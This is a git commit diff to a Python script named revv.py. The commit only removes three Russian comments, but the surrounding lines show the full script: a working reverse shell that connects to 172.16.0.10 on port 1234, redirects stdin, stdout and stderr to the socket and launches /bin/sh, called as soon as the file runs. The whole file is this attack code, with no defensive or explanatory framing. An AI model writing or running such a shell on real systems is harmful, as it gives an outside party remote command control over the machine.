c15fe928000f6ad80b2d1fda66c135f4efee591a
qsoul <64313275+h00kmeat@users.noreply.github.com>
2024-08-10 05:54:36 +0300

    Update revv.py

--- revv.py
+++ revv.py
@@ -4,9 +4,9 @@ import os
 def reverse_shell(target_ip='172.16.0.10', target_port=1234):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, target_port))
-    os.dup2(s.fileno(), 0)  # Перенаправление stdin
-    os.dup2(s.fileno(), 1)  # Перенаправление stdout
-    os.dup2(s.fileno(), 2)  # Перенаправление stderr
+    os.dup2(s.fileno(), 0)  
+    os.dup2(s.fileno(), 1)  
+    os.dup2(s.fileno(), 2)  
     os.system('/bin/sh')
 
 reverse_shell('172.16.0.10', 1234)
